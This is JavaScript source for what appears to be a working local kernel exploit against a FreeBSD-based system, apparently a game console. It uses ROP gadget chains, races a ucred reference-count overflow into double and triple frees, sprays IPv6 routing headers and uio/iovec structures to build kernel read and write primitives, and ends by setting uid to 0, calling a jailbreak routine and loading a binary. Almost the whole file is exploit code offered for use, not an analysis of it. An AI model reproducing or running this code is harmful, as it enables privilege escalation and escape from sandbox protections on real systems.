//#region Variables
const NUM_FDS = 0x50;
const NUM_THREADS = 4;
const NUM_IOV_THREAD = 1;
const NUM_UIO_THREAD = 1;
const NUM_IPV6_SOCK = 0x50;
const NUM_ATTEMPT_TWINS = 0x10;
const NUM_ATTEMPT_TRIPLETS = 0x10;
const NUM_LEAK_KQUEUE = 0x100;
const NUM_IOV_SPRAY = 0x100;
const NUM_UIO_SPRAY = 0x100;
const NUM_CR_REFCNT_END = 0xffffffb0n;
//#endregion
//#region Contants
const UIO_READ = 0;
const UIO_WRITE = 1;
const UIO_SYSSPACE = 1;

const NUM_UIO_IOV = 0x14;
const NUM_MSG_IOV = 0x17;

const COMMAND_IOV_RECVMSG = 0;
const COMMAND_UIO_READ = 0;
const COMMAND_UIO_WRITE = 1;

const iov_ss = new Array(2);
const uio_ss = new Array(2);
const twins = new Array(2);
const triplets = new Array(3);
const fds = new Array(NUM_FDS);
const workers = new Array(NUM_THREADS);
const ipv6_socks = new Array(NUM_IPV6_SOCK);
const iov_threads = new Array(NUM_IOV_THREAD);
const uio_threads = new Array(NUM_UIO_THREAD);

let msg = undefined;
let msg_iov = undefined;
let msg_uio = undefined;
let uio_iov_read = undefined;
let uio_iov_write = undefined;

let iov_worker = undefined;
let uio_worker = undefined;

let kq_fdp = undefined;
let tmp = undefined;

fn.setuid = new NativeFunction(0x17, "number");
fn.socketpair = new NativeFunction(0x87, "number");
fn.kqueueex = new NativeFunction(0x8d, "number");
fn.poll = new NativeFunction(0xd1, "number");
fn.kqueue = new NativeFunction(0x16a, "number");
//#endregion
//#region Functions
function format_time(ms) {
  const total = Math.floor(ms / 1000);

  const hours = Math.floor(total / 3600);
  const minutes = Math.floor((total % 3600) / 60);
  const seconds = total % 60;
  const millis = Math.floor(ms % 1000);

  return hours.toString().padStart(2, "0") + ":" + minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0") + "." + millis.toString().padStart(3, "0");
}

function spawn_worker_threads(counter_addr) {
  logger?.debug("Spawn worker threads...");

  for (let i = 0; i < workers.length; i++) {
    const worker = {};

    worker.frame = new Frame(["loop", "end"]);
    worker.stack = new Stack(0x1000);

    worker.thread = new Thread(`worker_${i}`, 0x4000);
    worker.thread.spawn();

    const insts = [];

    const mask = cpuset.new();

    mask.bits[0] = (1 << i).bigint();

    const prio = rtprio.new();

    prio.type = RTP_PRIO_REALTIME;
    prio.prio = 0x100;

    fn.cpuset_setaffinity.chain(insts, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, cpuset.sizeof, mask.addr);
    fn.rtprio_thread.chain(insts, RTP_SET, 0, prio.addr);
    fn.kqueueex.chain(insts, 0x800000000000n);

    // loop
    const loop_index = insts.length;

    // branch
    insts.push(gadgets.POP_RDI_RET);
    insts.push(counter_addr + 0x10n);
    insts.push(gadgets.POP_RAX_RET);
    insts.push(1n);
    insts.push(gadgets.LOCK_XADD_QWORD_PTR_RDI_RAX_RET);

    insts.push(gadgets.POP_RDX_RET);
    insts.push(NUM_CR_REFCNT_END - 1n);

    insts.push(gadgets.SUB_RDX_RAX_RET);

    worker.frame.load(insts, "end");
    insts.push(gadgets.XCHG_RSI_RAX_RET);

    worker.frame.load(insts, "loop");

    insts.push(gadgets.CMOVB_RAX_RSI_RET);
    insts.push(gadgets.XCHG_RSP_RAX_RET);

    // jmp back to loop
    const jmp_start_index = insts.length;

    insts.push(gadgets.POP_RAX_RET);
    insts.push(fn.kqueueex.id);
    insts.push(gadgets.POP_RDI_RET);
    insts.push(0x800000000000n);
    insts.push(gadgets.POP_RBX_SUB_ECX_ECX_POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET);

    const jmp_end_index = insts.length + 2;

    insts.push((-((jmp_end_index - loop_index) * BigUint64Array.BYTES_PER_ELEMENT)).bigint());
    insts.push(fn.kqueueex.addr);

    // end
    const end_index = insts.length;

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0n);
    insts.push(gadgets.RET);

    worker.stack.prepare(insts, worker.frame);

    worker.thread.inject(worker.stack);

    const new_sp = worker.thread.pivot_frame.get_value("rsp");

    worker.frame.set_value("loop", new_sp + (jmp_start_index * BigUint64Array.BYTES_PER_ELEMENT).bigint());
    worker.frame.set_value("end", new_sp + (end_index * BigUint64Array.BYTES_PER_ELEMENT).bigint());

    workers[i] = worker;
  }

  logger?.debug("worker threads spawned !!");
}

function spawn_iov_threads() {
  logger?.debug("Spawn iov threads...");

  // Prepare workers
  iov_worker = new Worker(iov_threads.length);

  logger?.debug(`iov_worker_ctx_addr: ${iov_worker.ctx.addr.hex()}`);

  const iov_start =
    "let logger;" +
    userland +
    worker +
    `
      const COMMAND_IOV_RECVMSG = 0;

      const iov_worker = new Worker(${iov_worker.ctx.addr}n);

      fn.recvmsg = new NativeFunction(0x1B, "bigint");

      const msg_addr = ${msg.addr}n;
      const iov_ss = [${iov_ss[0]}, ${iov_ss[1]}];

      while (true) {
        const cmd = iov_worker.wait_for_work();
        if (cmd === COMMAND_STOP) break;

        if (cmd === COMMAND_IOV_RECVMSG) {
          fn.recvmsg.invoke(iov_ss[0], msg_addr, 0);
        }

        iov_worker.signal_finished();
      }
    `;

  // Create iov threads
  for (let i = 0; i < iov_threads.length; i++) {
    const name = `iov_thread_${i}`;

    iov_threads[i] = new JSThread(name, iov_start);
    iov_threads[i].execute();
  }

  logger?.debug("iov threads spawned !!");
}

function spawn_uio_threads() {
  logger?.debug("Spawn uio threads...");

  // Prepare workers
  uio_worker = new Worker(uio_threads.length);

  logger?.debug(`uio_worker_ctx_addr: ${uio_worker.ctx.addr.hex()}`);

  const uio_start =
    "let logger;" +
    userland +
    worker +
    `
      const UIO_IOV_NUM = 0x14;
      const COMMAND_UIO_READ = 0;
      const COMMAND_UIO_WRITE = 1;

      const uio_worker = new Worker(${uio_worker.ctx.addr}n);

      fn.readv = new NativeFunction(0x78, "bigint");
      fn.writev = new NativeFunction(0x79, "bigint");
      
      const uio_iov_read_addr = ${uio_iov_read.addr}n;
      const uio_iov_write_addr = ${uio_iov_write.addr}n;
      const uio_ss = [${uio_ss[0]}, ${uio_ss[1]}];

      while (true) {
        const cmd = uio_worker.wait_for_work();
        if (cmd === COMMAND_STOP) break;

        switch(cmd) {
          case COMMAND_UIO_READ:
            if (fn.writev.invoke(uio_ss[1], uio_iov_read_addr, UIO_IOV_NUM) === -1n) {
              throw new SyscallError(\`Unable to write vector of size \${UIO_IOV_NUM} to fd \${uio_ss[1]} !!\`);
            }
            break;
          case COMMAND_UIO_WRITE:
            if (fn.readv.invoke(uio_ss[0], uio_iov_write_addr, UIO_IOV_NUM) === -1n) {
              throw new SyscallError(\`Unable to read vector of size \${UIO_IOV_NUM} to fd \${uio_ss[0]} !!\`);
            }
            break;
        }

        uio_worker.signal_finished();
      }
    `;

  // Create uio threads
  for (let i = 0; i < uio_threads.length; i++) {
    const name = `uio_thread_${i}`;

    uio_threads[i] = new JSThread(name, uio_start);
    uio_threads[i].execute();
  }

  logger?.debug("uio threads spawned !!");
}

function stop_iov_threads() {
  if (iov_threads.some((x) => typeof x !== "undefined")) {
    logger?.debug("Signaling stop to iov threads...");

    iov_worker.signal_work(COMMAND_STOP);

    for (let i = 0; i < iov_threads.length; i++) {
      iov_threads[i].join();
    }

    logger?.debug("iov threads stopped !!");

    iov_worker.free();
  }
}

function stop_uio_threads() {
  if (uio_threads.some((x) => typeof x !== "undefined")) {
    logger?.debug("Signaling stop to uio threads...");

    uio_worker.signal_work(COMMAND_STOP);

    for (let i = 0; i < uio_threads.length; i++) {
      uio_threads[i].join();
    }

    logger?.debug("uio threads stopped !!");

    uio_worker.free();
  }
}

function find_twins() {
  for (let i = 0; i < NUM_ATTEMPT_TWINS; i++) {
    for (let j = 0; j < ipv6_socks.length; j++) {
      arw.view(spray_rthdr0_addr).setInt32(4, j, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[j]);
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
      if (idx !== j) {
        logger?.debug(`Found twins after ${i} iterations !!`);

        twins[0] = ipv6_socks[j];
        twins[1] = ipv6_socks[idx];

        logger?.info(`Found twins: ${twins} !!`);

        return;
      }
    }
  }

  for (let i = 0; i < ipv6_socks.length; i++) {
    free_rthdr(ipv6_socks[i]);
  }

  throw new Error("Unable to find twins !!");
}

function find_triplet(master, slave) {
  for (let i = 0; i < NUM_ATTEMPT_TRIPLETS; i++) {
    for (let j = 0; j < ipv6_socks.length; j++) {
      if (ipv6_socks[j] === master || ipv6_socks[j] === slave) {
        continue;
      }

      arw.view(spray_rthdr0_addr).setInt32(4, j, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[j]);
    }

    get_rthdr(master, ip6_rthdr0.sizeof);

    const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
    if (ipv6_socks[idx] !== master && ipv6_socks[idx] !== slave) {
      logger?.debug(`Found triplet after ${i} iterations !!`);
      return ipv6_socks[idx];
    }
  }

  throw new Error("Unable to find triplet !!");
}

function init() {
  logger?.info("Environment init started...");

  // Prepare spray/leak rthdr0
  spray_rthdr0_addr = mem.alloc(UCRED_SIZE);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, UCRED_SIZE);

  leak_rthdr0_addr = mem.alloc(UCRED_SIZE);

  // Prepare msg iov
  const msg_iov_addr = mem.alloc(iovec.sizeof * NUM_MSG_IOV);
  msg_iov = iovec.new(msg_iov_addr);
  msg_uio = uio.new(msg_iov_addr);

  msg = msghdr.new();

  msg.msg_iov = msg_iov.addr;
  msg.msg_iovlen = NUM_MSG_IOV;

  const uio_iov_addr = mem.alloc(iovec.sizeof * NUM_UIO_IOV);
  uio_iov_read = iovec.new(uio_iov_addr);
  uio_iov_write = iovec.new(uio_iov_addr);

  const dummy_sz = 0x1000;
  const dummy_addr = mem.alloc(dummy_sz);

  mem.bset(dummy_addr, dummy_sz, 0x41);

  uio_iov_read.iov_base = dummy_addr;
  uio_iov_write.iov_base = dummy_addr;

  // Prepare temp buffer
  tmp = mem.alloc(PAGE_SIZE);

  logger?.info("Environment init completed !!");
}

function setup() {
  logger?.info("Environment setup started...");

  make_karw_pipe();

  const pair_addr = mem.alloc(8);

  // Create socket pair for iov spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError("Unable to create socket pair !!");
  }

  iov_ss[0] = arw.view(pair_addr).getInt32(0, true);
  iov_ss[1] = arw.view(pair_addr).getInt32(4, true);

  // Create socket pair for uio spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError("Unable to create socket pair !!");
  }

  uio_ss[0] = arw.view(pair_addr).getInt32(0, true);
  uio_ss[1] = arw.view(pair_addr).getInt32(4, true);

  logger?.debug(`iov_ss: ${iov_ss}`);
  logger?.debug(`uio_ss: ${uio_ss}`);

  mem.free(pair_addr);

  // Setup sockets for spraying and initialize pktopts
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
  }

  spawn_iov_threads();
  spawn_uio_threads();

  logger?.info("Environment setup completed !!");
}

function cleanup() {
  logger?.info("Environment cleanup started...");

  for (const sock of fds) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of iov_ss) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of uio_ss) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of ipv6_socks) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  free_karw_pipe();

  stop_iov_threads();
  stop_uio_threads();

  mem.free(spray_rthdr0_addr);
  mem.free(leak_rthdr0_addr);
  mem.free(msg_iov.addr);
  mem.free(msg_uio.addr);
  mem.free(msg.addr);
  mem.free(tmp.addr);

  logger?.info("Environment cleanup completed !!");
}

function ucred_triple_free() {
  logger?.info("Ucred double free started...");

  const cr_refcnt = 3n;

  const cr_refcnt_addr = arw.addrof(cr_refcnt);

  spawn_worker_threads(cr_refcnt_addr);

  // Allocate a new ucred
  if (fn.setuid.invoke(1) === -1) {
    throw new SyscallError("Unable to set uid to 1 !!");
  }

  logger?.info("Starting workers, this may take ~50min...");

  const start = performance.now();

  // Start workers
  for (let i = 0; i < workers.length; i++) {
    workers[i].thread.resume();
  }

  let last_step = -1n;

  while (cr_refcnt <= NUM_CR_REFCNT_END) {
    const step = cr_refcnt >> 24n;
  
    if (step !== last_step) {
      last_step = step;
    
      const current = performance.now();
    
      logger?.debug(`cr_refcnt: ${cr_refcnt.hex()} time: ${format_time(current - start)}`);
    }
  }

  // wait for workers to join
  for (let i = 0; i < workers.length; i++) {
    workers[i].thread.join();
  }

  logger?.info("Workers finished !!");

  const end = performance.now();

  logger?.info(`cr_refcnt: ${cr_refcnt.hex()} elapsed time: ${format_time(end - start)} !!`);

  // Opening /dev/null files to overflow cr_refcnt
  for (let i = 0; i < fds.length; i++) {
    fds[i] = fn.open.invoke("/dev/null");
    if (fds[i] < 0) {
      throw new SyscallError("Unable to open /dev/null !!");
    }
  }

  // Free the previous ucred.
  if (fn.setuid.invoke(1) === -1) {
    throw new SyscallError("Unable to set uid to 1 !!");
  }

  const buf = mem.alloc(UCRED_SIZE);

  arw.view(buf).setUint32(0, 1, true);

  // Close files until we achive ucred double free, then proceed with triple free
  while (fds.length > 0) {
    try {
      const fd = fds.pop();

      logger?.debug(`closing file ${fd}...`);

      // Set cr_refcnt back to 1
      for (let i = 0; i < 0x20; i++) {
        fn.poll.invoke(buf, UCRED_SIZE / 8);
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }

      logger?.debug(`attempt to set cr_refcnt back to 1 started...`);

      // Set cr_refcnt back to 1
      for (let i = 0; i < 0x20; i++) {
        fn.poll.invoke(buf, UCRED_SIZE / 8);
      }

      logger?.debug("Looking for twins...");

      find_twins();

      logger?.info(`Ucred double free achieved !!`);

      logger?.info("Ucred triple free started...");

      // Free one
      free_rthdr(twins[1]);

      logger?.debug(`attempt to set cr_refcnt back to 1 started...`);

      let reclaimed = false;

      // Set cr_refcnt back to 1
      for (let i = 0; i < 0x20; i++) {
        fn.poll.invoke(buf, UCRED_SIZE / 8);

        get_rthdr(twins[0], ip6_rthdr0.sizeof);

        const cr_refcnt = arw.view(leak_rthdr0_addr).getInt32(0, true);
        if (cr_refcnt === 1) {
          logger?.debug(`Set cr_refcnt back to 1 after ${i} iterations !!`);
          reclaimed = true;
          break;
        }
      }

      if (!reclaimed) {
        throw new Error("Unable to set cr_refcnt back to 1 !!");
      }

      logger?.info(`Set cr_refcnt back to 1 !!`);

      const fd1 = fds.pop();

      if (fn.close.invoke(fd1) === -1) {
        throw new SyscallError(`Unable to close fd ${fd1} !!`);
      }

      logger?.debug("Looking for triplets...");

      triplets[0] = twins[0];
      triplets[1] = find_triplet(triplets[0], -1);
      triplets[2] = find_triplet(triplets[0], triplets[1]);

      logger?.info(`Found triplet: ${triplets} !!`);

      logger?.info(`Ucred triple free achieved !!`);

      break;
    } catch (e) {
      logger?.debug(e);
    }
  }

  mem.free(buf);

  if (triplets.some((x) => !Number.isFinite(x))) {
    throw new Error("Failed to ucred triple free !!");
  }
}

function leak_kqueue() {
  logger?.info("Leak kqueue started...");

  // Free one
  free_rthdr(triplets[2]);

  let kq;
  let leaked = false;
  for (let i = 0; i < NUM_LEAK_KQUEUE; i++) {
    kq = fn.kqueue.invoke();
    if (kq === -1) {
      throw new SyscallError("Unable to get kqueue !!");
    }

    get_rthdr(triplets[0], KQUEUE_SIZE);

    const kq_hdr = arw.view(leak_rthdr0_addr).getBigUint64(8, true);
    if (kq_hdr === 0x1430000n) {
      logger?.debug(`Leaked kqueue after ${i} iterations !!`);
      leaked = true;
      break;
    }

    if (fn.close.invoke(kq) === -1) {
      throw new SyscallError(`Unable to close fd ${kq} !!`);
    }
  }

  if (!leaked) {
    throw new Error("Unable to leak kqueue !!");
  }

  logger?.info("Leaked kqueue !!");

  kq_fdp = arw.view(leak_rthdr0_addr).getBigUint64(0xa8, true);
  logger?.debug(`kq_fdp: ${kq_fdp.hex()}`);

  // Close kqueue to free buffer
  if (fn.close.invoke(kq) === -1) {
    throw new SyscallError(`Unable to close fd ${kq} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  logger?.debug(`Found triplet: ${triplets} !!`);

  logger?.info("Leak kqueue completed !!");
}

function kread_slow(addr, sz) {
  // Prepare leak buffers
  const leak_bufs = new Array(uio_threads.length);
  for (let i = 0; i < leak_bufs.length; i++) {
    leak_bufs[i] = mem.alloc(sz);
  }

  // Set send buf size
  const buf_sz_addr = mem.alloc(4);

  arw.view(buf_sz_addr).setInt32(0, sz, true);

  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
  }

  mem.free(buf_sz_addr);

  // Fill queue
  if (fn.write.invoke(uio_ss[1], tmp, sz) === -1n) {
    throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
  }

  // Set iov length
  uio_iov_read.iov_len = sz.bigint();

  // Free one
  free_rthdr(triplets[2]);

  logger?.debug("Signaling work to uio threads...");

  let reclaimed = false;

  // Reclaim with uio
  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
    uio_worker.signal_work(COMMAND_UIO_READ);
    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], iovec.sizeof);

    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
    if (iov_len === NUM_UIO_IOV) {
      logger?.debug(`Reclaim with uio after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Wake up all threads
    if (fn.read.invoke(uio_ss[0], tmp, sz) === -1n) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }

    for (let j = 0; j < leak_bufs.length; j++) {
      if (fn.read.invoke(uio_ss[0], leak_bufs[j], sz) === -1n) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
      }
    }

    uio_worker.wait_for_finished();

    // Fill queue
    if (fn.write.invoke(uio_ss[1], tmp, sz) === -1n) {
      throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
    }
  }

  logger?.debug("uio threads work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim with uio !!");
  }

  const uio_iov = arw.view(leak_rthdr0_addr).getBigUint64(0, true);

  // Prepare uio reclaim buffer
  msg_uio.uio_iov = uio_iov;
  msg_uio.uio_iovcnt = NUM_UIO_IOV;
  msg_uio.uio_offset = -1n;
  msg_uio.uio_resid = uio_iov_read.iov_len;
  msg_uio.uio_segflg = UIO_SYSSPACE;
  msg_uio.uio_rw = UIO_WRITE;
  msg_uio.uio_td = 0n;

  msg_iov[3].iov_base = addr;
  msg_iov[3].iov_len = uio_iov_read.iov_len;

  // Free second one
  free_rthdr(triplets[1]);

  logger?.debug("Signaling work to iov threads...");

  reclaimed = false;

  // Reclaim uio with iov
  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
    // Reclaim with iov
    iov_worker.signal_work(COMMAND_IOV_RECVMSG);
    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
    if (uio_segflg === UIO_SYSSPACE) {
      logger?.debug(`Reclaim uio with iov after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Release iov spray
    if (fn.write.invoke(iov_ss[1], tmp, 1) === -1n) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    iov_worker.wait_for_finished();

    if (fn.read.invoke(iov_ss[0], tmp, 1) === -1n) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }
  }

  logger?.debug("iov threads work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim uio with iov !!");
  }

  // Wake up all threads
  if (fn.read.invoke(uio_ss[0], tmp, sz) === -1n) {
    throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
  }

  // Read the results now
  let leak_buf;

  // Get leak
  for (let i = 0; i < leak_bufs.length; i++) {
    if (fn.read.invoke(uio_ss[0], leak_bufs[i], sz) === -1n) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }

    const val = arw.view(leak_bufs[i]).getBigUint64(0, true);
    if (val !== 0x4141414141414141n) {
      triplets[1] = find_triplet(triplets[0], -1);

      leak_buf = leak_bufs[i];
      continue;
    }

    mem.free(leak_bufs[i]);
  }

  uio_worker.wait_for_finished();

  // Release iov spray
  if (fn.write.invoke(iov_ss[1], tmp, 1) === -1n) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  iov_worker.wait_for_finished();

  if (fn.read.invoke(iov_ss[0], tmp, 1) === -1n) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
  }

  logger?.debug(`Found triplet: ${triplets} !!`);

  if (typeof leak_buf === "undefined") {
    throw new Error(`Unable to kread ${addr} !!`);
  }

  return leak_buf;
}

function kwrite_slow(dst, src, sz) {
  // Set send buf size
  const buf_sz_addr = mem.alloc(4);

  arw.view(buf_sz_addr).setInt32(0, sz, true);

  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
  }

  mem.free(buf_sz_addr);

  // Set iov length
  uio_iov_write.iov_len = sz.bigint();

  // Free one
  free_rthdr(triplets[2]);

  logger?.debug("Signaling work to uio threads...");

  let reclaimed = false;

  // Reclaim with uio
  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
    uio_worker.signal_work(COMMAND_UIO_WRITE);
    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], iovec.sizeof);

    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
    if (iov_len === NUM_UIO_IOV) {
      logger?.debug(`Reclaim with uio after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Wake up all threads
    for (let j = 0; j < uio_threads.length; j++) {
      if (fn.write.invoke(uio_ss[1], src, sz) === -1n) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
      }
    }

    uio_worker.wait_for_finished();
  }

  logger?.debug("uio threads work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim with uio !!");
  }

  const uio_iov = arw.view(leak_rthdr0_addr).getBigUint64(0, true);

  // Prepare uio reclaim buffer
  msg_uio.uio_iov = uio_iov;
  msg_uio.uio_iovcnt = NUM_UIO_IOV;
  msg_uio.uio_offset = -1n;
  msg_uio.uio_resid = uio_iov_write.iov_len;
  msg_uio.uio_segflg = UIO_SYSSPACE;
  msg_uio.uio_rw = UIO_READ;
  msg_uio.uio_td = 0n;

  msg_iov[3].iov_base = dst;
  msg_iov[3].iov_len = uio_iov_write.iov_len;

  // Free second one
  free_rthdr(triplets[1]);

  logger?.debug("Signaling work to iov threads...");

  reclaimed = false;

  // Reclaim uio with iov
  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
    // Reclaim with iov
    iov_worker.signal_work(COMMAND_IOV_RECVMSG);
    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
    if (uio_segflg === UIO_SYSSPACE) {
      logger?.debug(`Reclaim uio with iov after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Release iov spray
    if (fn.write.invoke(iov_ss[1], tmp, 1) === -1n) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    iov_worker.wait_for_finished();

    if (fn.read.invoke(iov_ss[0], tmp, 1) === -1n) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }
  }

  logger?.debug("iov threads work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim uio with iov !!");
  }

  // Corrupt data
  for (let i = 0; i < uio_threads.length; i++) {
    if (fn.write.invoke(uio_ss[1], src, sz) === -1n) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
    }
  }

  triplets[1] = find_triplet(triplets[0], -1);

  uio_worker.wait_for_finished();

  // Release iov spray
  if (fn.write.invoke(iov_ss[1], tmp, 1) === -1n) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  iov_worker.wait_for_finished();

  if (fn.read.invoke(iov_ss[0], tmp, 1) === -1n) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
  }

  logger?.debug(`Found triplet: ${triplets} !!`);
}

function kread8_slow(addr) {
  return arw.view(kread_slow(addr, 8)).getBigUint64(0, true);
}

function make_karw() {
  logger?.info("Initiate kernel ARW...");

  fdt_ofiles = kread8_slow(kq_fdp) + 8n;
  logger?.debug(`fdt_ofiles: ${fdt_ofiles.hex()}`);

  const master_pipe_fp = kread8_slow(fdt_ofiles + (master_pipe[0] * FILEDESCENT_SIZE).bigint());
  logger?.debug(`master_pipe_fp: ${master_pipe_fp.hex()}`);

  const slave_pipe_fp = kread8_slow(fdt_ofiles + (slave_pipe[0] * FILEDESCENT_SIZE).bigint());
  logger?.debug(`slave_pipe_fp: ${slave_pipe_fp.hex()}`);

  const master_pipe_f_data = kread8_slow(master_pipe_fp);
  logger?.debug(`master_pipe_f_data: ${master_pipe_f_data.hex()}`);

  const slave_pipe_f_data = kread8_slow(slave_pipe_fp);
  logger?.debug(`slave_pipe_f_data: ${slave_pipe_f_data.hex()}`);

  const pipe_buf = pipebuf.new();

  pipe_buf.cnt = 0;
  pipe_buf.in = 0;
  pipe_buf.out = 0;
  pipe_buf.size = PAGE_SIZE;
  pipe_buf.buffer = slave_pipe_f_data;

  kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);

  mem.free(pipe_buf.addr);

  kv = new KernelView(master_pipe, slave_pipe);

  logger?.info("Achieved kernel ARW !!");
}

//#region Structs
const iovec = new Struct("iovec", [
  { type: "Uint64", name: "iov_base" },
  { type: "Uint64", name: "iov_len" },
]);

const msghdr = new Struct("msghdr", [
  { type: "Uint64", name: "msg_name" },
  { type: "Uint32", name: "msg_namelen" },
  { type: "iovec*", name: "msg_iov" },
  { type: "Int32", name: "msg_iovlen" },
  { type: "Uint64", name: "msg_control" },
  { type: "Uint32", name: "msg_controllen" },
  { type: "Int32", name: "msg_flags" },
]);

const uio = new Struct("uio", [
  { type: "Uint64", name: "uio_iov" },
  { type: "Uint32", name: "uio_iovcnt" },
  { type: "Uint64", name: "uio_offset" },
  { type: "Uint64", name: "uio_resid" },
  { type: "Uint32", name: "uio_segflg" },
  { type: "Uint32", name: "uio_rw" },
  { type: "Uint64", name: "uio_td" },
]);
//#endregion

try {
  init();
  setup();
  ucred_triple_free();
  leak_kqueue();
  make_karw();

  inc_karw_pipe_refcnt();

  logger?.info("Corrupted context cleanup started...");

  // Remove rthdr pointers from triplets
  for (let i = 0; i < triplets.length; i++) {
    remove_rthdr_from_so(triplets[i]);
  }

  logger?.info("Corrupted context cleanup completed !!");

  find_all_proc();

  // Avoid reapplying if already done
  if (fn.setuid.invoke(0) === -1) {
    jailbreak();

    load_bin();
  }
} catch (e) {
  logger?.error(e.stack);
  mem.free_all();
} finally {
  cleanup();
}
